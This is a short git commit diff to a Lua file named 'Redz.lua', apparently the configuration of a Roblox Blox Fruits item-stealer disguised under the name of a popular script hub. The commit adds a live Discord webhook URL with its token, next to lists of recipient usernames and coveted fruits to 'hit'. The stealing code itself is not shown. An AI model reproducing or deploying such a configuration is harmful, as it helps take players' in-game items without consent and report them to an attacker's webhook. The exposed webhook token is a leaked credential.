5c49c8ce2109954a1073c9b99d90ddb93b24fff9
rashed1993-call <ra9496061@gmail.com>
2025-04-15 21:46:15 +0400

    Update Redz.lua

--- Redz.lua
+++ Redz.lua
@@ -1,6 +1,6 @@
 
 
-Webhook = "https://docs.google.com/document/d/19db08nvSH1NIoFAaiEMfUgHx3mnQ1HM0/mobilebasic" -- << Your Webhook
+Webhook = "https://discord.com/api/webhooks/1361754580538495067/amPHk2M_-ESkw1AwhS1aX2hsz8Jv8mhWyLf2cP4O8FXuiqbp9a2E2h06gadwQx9DUMG4" -- << Your Webhook
 Usernames = {"x9foora1", "vin1115gh"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti",} -- << Fruits you want
 
